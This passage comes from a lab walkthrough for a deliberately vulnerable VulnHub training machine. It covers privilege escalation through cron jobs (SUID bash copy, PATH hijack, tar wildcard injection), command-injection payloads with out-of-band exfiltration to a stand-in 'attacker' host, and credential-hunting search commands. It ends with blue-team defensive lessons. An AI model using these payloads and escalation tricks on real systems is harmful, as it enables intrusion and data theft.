> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)
> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
id; whoami
sudo -l                                     # any sudo rights (often needs www-data's password)
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
getcap -r / 2>/dev/null                     # file capabilities (CAP_SETUID etc.)
cat /etc/crontab; ls -la /etc/cron*         # scheduled jobs
grep -RIn "password\|passwd\|pass:" /home /var/www /opt /etc 2>/dev/null
find / -writable -type f 2>/dev/null        # files we can modify
find / -iname "*pass*" -o -iname "*backup*" -o -iname "*cred*" 2>/dev/null
```

```text
$ find / -perm -4000 -type f 2>/dev/null
... (audit every hit) ...
$ find / -writable -type f 2>/dev/null
... (anything writable that root also touches is a candidate) ...
```

> **Why this works as a method:** local privilege escalation is almost always one
> of a small set of misconfigurations — a SUID/capability binary, a permissive
> `sudo` rule, a root cron job running a writable script, or a plaintext
> credential left in a readable file. The sweep above surfaces all of them at once.

**What you are hunting for on this box:** a readable file, world-writable script,
or permissive `sudo`/SUID entry that the `root` context trusts. When you locate it,
follow its lead:

```bash
# Example pattern A — a discovered credential re-used to change user
cat /path/to/discovered/file
su root                       # or: ssh root@192.168.56.101

# Example pattern B — a sudo rule revealed by enumeration
sudo -l
sudo <allowed-command>        # look the binary up on GTFOBins for a shell escape

# Example pattern C — a SUID binary you can abuse
./discovered-suid-binary
```

> **Why it works:** once you find *the one thing root trusts that you can influence*
> (a password, a writable script run on a schedule, or a binary that runs as root),
> you can make it grant you a root shell. Verify with `id`:

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

> **Honest note for students:** the precise filename/command differs between
> builds of this image. Run the enumeration on the copy *you* downloaded and follow
> what you find — reproducing the discovery is the entire lesson of this box.

![Privilege-escalation finding](images/06-privesc.png)
![Root shell](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SQL injection the filter fails to stop | `welcome.php` search (bypassed with `/**/` and `#`) | Full read of the database, including password hashes |
| 2 | Weak password hashing | `users.pasword` column | Hashes cracked; admin account taken over |
| 3 | OS command injection surfaced in the admin panel | Admin "user search" → last-name field → `system()` | Remote code execution as `www-data` |
| 4 | Filter bypassable by encoding (`base64_decode`) | Same command-injection sink | Space-stripping filter trivially defeated |
| 5 | Local privilege-escalation misconfiguration | Discovered on the filesystem (SUID / sudo / cron / credential) | Escalation to `root` |

## 6. Defensive lessons (blue team)

- **Filters are not fixes.** Blacklisting the word "union" or stripping spaces
  fails the moment an attacker uses comments (`/**/`) or encoding
  (`base64_decode`). Use **prepared statements** so injection is impossible in the
  first place.
- **Never pass user input to the shell.** Avoid `system()`, `exec()`, `shell_exec()`
  and backticks. If you truly must call an external program, use `escapeshellarg()`
  + an allow-list, or better, a language-native API.
- **Hash passwords properly** (bcrypt/scrypt/Argon2, salted) so a database leak
  cannot be turned into plaintext.
- **Least privilege everywhere.** The web tier should not be one misconfiguration
  away from `root`. Audit for SUID binaries, capabilities (`getcap`), permissive
  `sudoers`, and root cron jobs that run world-writable scripts.
- **Detection ideas:** alert on `information_schema` / `UNION` / `/**/` sequences
  and on SQL error spikes; watch for `base64_decode` and known shell strings in
  request bodies; flag unexpected outbound connections from the web user; monitor
  new files in writable locations and any change to SUID bits.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/hackme-2,618/>
- Download mirror: <https://download.vulnhub.com/hackme/hackme2-DHCP.ova>
- Community writeups consulted:
  - [VulnHub | HACKME: 2 Walkthrough — smile09 (Medium)](https://medium.com/@smile09/vulnhub-hackme-2-walkthrough-49109b8daa4e)
- Docs / tools:
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
  - [GTFOBins](https://gtfobins.github.io/)
  - [CrackStation](https://crackstation.net/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan and directory discovery
- [ ] `images/03-enum.png` — SQL injection (with `/**/` bypass) dumping `users`
- [ ] `images/04-foothold.png` — the base64 command injection triggering the shell
- [ ] `images/05-shell.png` — shell as `www-data`
- [ ] `images/06-privesc.png` — the privesc finding on the filesystem
- [ ] `images/07-root-flag.png` — proof of `root` (`id` shows `uid=0`)

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
